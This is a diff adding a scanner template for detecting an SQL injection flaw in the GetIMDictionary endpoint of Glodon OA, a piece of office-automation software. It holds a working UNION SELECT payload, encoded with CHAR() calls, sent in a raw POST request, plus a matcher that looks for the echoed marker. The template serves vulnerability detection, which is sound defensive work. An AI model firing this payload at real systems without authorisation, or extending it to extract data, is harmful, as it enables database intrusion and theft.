@@ -1,0 +1,31 @@
+id: glodon-oa-sql-injection
+info:
+  name: Glodon OA GetIMDictionary SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Glodon OA has an SQL injection vulnerability in the GetIMDictionary endpoint, allowing attackers to execute arbitrary SQL queries and potentially retrieve sensitive database information.
+  tags:
+    - sqli
+  classification:
+    cve-id: []
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key=1'+UNION+ALL+SELECT+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(83)+CHAR(66)+CHAR(107)+CHAR(103)+CHAR(66)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(79)+CHAR(109)+CHAR(109)+CHAR(101)+CHAR(106)+CHAR(65)+CHAR(106)+CHAR(69)+CHAR(108)+CHAR(108)+CHAR(84)+CHAR(75)+CHAR(87)+CHAR(65)+CHAR(106)+CHAR(117)+CHAR(106)+CHAR(110)+CHAR(82)+CHAR(68)+CHAR(87)+CHAR(113)+CHAR(65)+CHAR(116)+CHAR(70)+CHAR(77)+CHAR(110)+CHAR(117)+CHAR(80)+CHAR(71)+CHAR(85)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113)--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qjzvqqSBkgBrZCOmmejAjEllTKWAjujnRDWqAtFMnuPGUqzkxq"
+      - type: status
+        status:
+          - 200
